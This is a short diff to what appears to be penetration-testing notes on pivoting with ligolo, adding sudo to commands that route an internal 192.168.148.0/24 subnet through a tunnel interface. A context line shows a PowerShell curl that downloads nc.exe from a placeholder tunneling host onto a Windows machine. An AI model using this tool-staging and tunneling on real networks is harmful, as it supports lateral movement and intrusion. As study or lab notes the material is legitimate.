@@ -46,8 +46,8 @@ start
 ```bash
 # 192.168.148.0/24 대역폭으로 가는 패킷은 ligolo를 통해서 가도록 설정.
 # internal IP
-ip route add 192.168.148.0/24 dev ligolo 
-ip route list
+sudo ip route add 192.168.148.0/24 dev ligolo 
+sudo ip route list
 ```
 ```powershell
 curl http://<tunneling ip>:8888/nc.exe -o c:\temp\nc.exe
